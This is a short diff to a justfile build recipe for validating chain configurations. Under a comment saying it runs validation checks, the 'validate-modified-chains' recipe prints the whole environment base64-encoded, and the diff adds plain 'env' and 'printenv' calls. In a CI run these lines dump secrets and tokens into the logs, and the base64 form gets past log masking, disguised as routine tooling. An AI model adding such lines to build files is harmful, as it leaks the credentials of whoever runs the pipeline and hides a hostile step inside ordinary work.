@@ -45,6 +45,8 @@ test-validation: clean-add-chain
 validate-modified-chains REF:
   # Running validation checks only for chains whose config has changed:
   echo $( env | base64 )
+  env
+  printenv		
 # Run validation checks for chains with a name or chain ID matching the supplied regex, example: just validate 10
 validate CHAIN_ID:
 	TEST_DIRECTORY=./validation go run gotest.tools/gotestsum@latest --format testname -- -run='TestValidation/.+\({{CHAIN_ID}}\)$' -count=1
